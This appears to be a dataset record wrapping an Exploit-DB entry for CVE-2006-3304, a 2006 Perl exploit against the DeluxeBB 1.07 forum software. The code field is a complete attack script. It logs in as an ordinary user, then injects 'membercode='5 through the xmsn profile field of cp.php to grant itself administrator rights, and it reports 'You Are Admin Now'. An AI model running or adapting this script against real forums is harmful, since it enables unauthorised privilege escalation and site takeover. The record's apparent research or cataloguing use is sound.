{
  "id": "1953",
  "title": "DeluxeBB 1.07 - Remote Create Admin",
  "cve": "CVE-2006-3304",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n# DeluxeBB <= 1.07 Create Admin Exploit\r\n#\r\n## www.h4ckerz.com / www.hackerz.ir / www.aria-security.net\r\n# ./2006-6-25\r\n### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net\r\n\r\nuse IO::Socket; \r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\n\r\n\r\n $host = $ARGV[0];\r\n $uname = $ARGV[1];\r\n $passwd = $ARGV[2];\r\n $url = \"http://\".$host;\r\n \r\n print q(\r\n ###########################################################\r\n #          DeluxeBB <= 1.07 Create Admin Exploit          # \r\n #           www.hackerz.ir - www.h4ckerz.com              #\r\n ################### Coded By Hessam-x #####################\r\n\r\n);\r\n\r\n\r\n \r\n if (@ARGV < 3) {\r\n print \" #  usage : hx.pl [host&path] [uname] [pass]\\n\"; \r\n print \" #  E.g : hx.pl www.milw0rm.com/deluxebb/ str0ke 123456\\n\"; \r\n  exit();\r\n }\r\n \r\n  \r\n    print \" [~] User/Password : $uname/$passwd \\n\";\r\n    print \" [~] Host : $host \\n\";\r\n    print \" [~] Login ... \";\r\n\r\n\r\n\r\n # Login In DeluxeBB <= 1.07 Create Admin Exploit\r\n \r\n $xpl = LWP::UserAgent->new() or die;\r\n $cookie_jar = HTTP::Cookies->new();\r\n\r\n $xpl->cookie_jar( $cookie_jar );\r\n $res = $xpl->post($url.'misc.php',\r\n Content => [\r\n \"sub\" => \"login\",\r\n \"name\" => \"$uname\",\r\n \"password\" => \"$passwd\",\r\n \"submit\" => \"Log-in\",\r\n \"redirect\" => \"\",\r\n \"expiry\" => \"990090909\",\r\n ],);\r\n \r\n  if($cookie_jar->as_string =~ /memberpw=(.*?);/) { \r\n  print \"successfully .\\n\";\r\n  } else { \r\n  print \"UNsuccessfully !\\n\";\r\n  print \" [-] Can not Login In $host !\\n\"; \r\n  print $cookie_jar->as_string;\r\n  exit(); \r\n  }\r\n\r\n  # Creat Admin :)\r\n\r\n$req = $xpl->get($url.'cp.php?sub=settings&xemail=h4x0r@h4x0r.net&xhideemail=0&xmsn=h4x0r\\',membercode=\\'5&xicq=&xaim=&xyim=&xlocation=&xsite=&languagex=English&skinx=default&xthetimeoffset=0&xthedateformat=d.m.y&xthetimeformat=12&invisiblebrowse=0&markposts=15&submit=Update');\r\n$tst = $xpl->get($url.'index.php');\r\nif ($tst->as_string =~ /Admin Cp/) { \r\nprint \" [+] You Are Admin Now !!\";\r\n} else {\r\n    print \" [-] Exploit Failed !\";\r\n    }\r\n\r\n# milw0rm.com [2006-06-25]",
  "url": "https://www.exploit-db.com/exploits/1953"
}